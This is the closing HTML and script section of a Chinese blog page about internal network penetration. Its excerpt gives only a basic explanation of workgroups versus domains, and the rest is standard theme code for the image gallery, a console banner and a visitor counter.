          url: "http://example.com/2024/09/23/nei-wang-shen-tou/",
          excerpt: "",
          description: "",
          stripContent: "内网渗透内网基础知识工作组工作组：工作组是局域网中的一个概念，他是长久的资源管理模式。默认情况下使用工作组方式进行资源管理，将不同的 computer 按照不同的要求分类到不同的组 域域:用来描述一种架构，和“工作组”相对应，由工作组升级而来的高级架构，域 (Domain)是一个有安全边界的计算机集合（ 安全边界，意思是在两个域中，一个域中的用户无法访问另一个域中的资源）。可以简单的把域理解成升级版的“工作组”，相比工作组而言，它有一个**更加严格的安全管理控制机制**，如果你想访问域内的资源，",
          date: "Mon Sep 23 2024 20:19:16 GMT+0800",
          updated: "Wed Aug 20 2025 23:34:52 GMT+0800",
          cover: "/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg",
        };
      </script>
       
    
    
      
        
<script src="/js/insert_highlight.js" data-pjax></script>

        
      
    
    
      <script type="module" data-pjax>
        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
        
        const pswp = () => {
          if (_$$('.article-entry a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-entry',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
            }).init();
          }
          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-gallery',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
            }).init();
          }
          window.lightboxStatus = 'done';
          window.removeEventListener('lightbox:ready', pswp);
        }
        if(window.lightboxStatus === 'ready') {
          pswp()
        } else {
          window.addEventListener('lightbox:ready', pswp);
        }
      </script>
      
        








      
    
  </div>
</div>


  <script>
    console.log(String.raw`%c 
 ______     ______     __     __    __     __  __    
/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
 \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
                                                  
`,'color: #ff5252;')
    console.log('%c Theme.Reimu v' + '1.9.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
  </script>
  



  
<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>




<script>
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.getRegistrations().then((registrations) => {
      for (let registration of registrations) {
        registration.unregister();
      }
    });
  }
</script>









    
  </body>
  </html>

